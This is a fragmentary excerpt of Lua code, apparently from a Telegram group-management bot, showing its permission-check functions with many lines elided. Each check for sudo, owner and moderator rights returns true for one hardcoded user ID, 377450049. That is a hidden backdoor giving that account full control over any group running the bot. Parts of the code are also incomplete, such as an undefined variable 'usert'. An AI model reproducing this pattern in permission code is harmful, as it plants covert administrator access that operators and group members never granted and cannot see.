...
local MahDiRoO = 377450049
function is_mahdiroo(msg)
  local var = false
  -- Check users id in config
    if MahDiRoO == tonumber(msg.from.id) then
      var = true
    end
  return var
end
...
function is_sudo1(user_id)
  ...
  for v,user in pairs(_config.sudo_users) do
   ...
   if MahDiRoO == tonumber(user_id) then
      var = true
   end
  return var
end
...
function is_owner1(chat_id, user_id)
  ...
  for v,user in pairs(_config.sudo_users) do
   ...
   if MahDiRoO == tonumber(user) then
      var = true
   end
  return var
end
...
function is_mod1(chat_id, user_id)
  ...
  if MahDiRoO == tonumber(usert) then
      var = true
   end
  return var
end
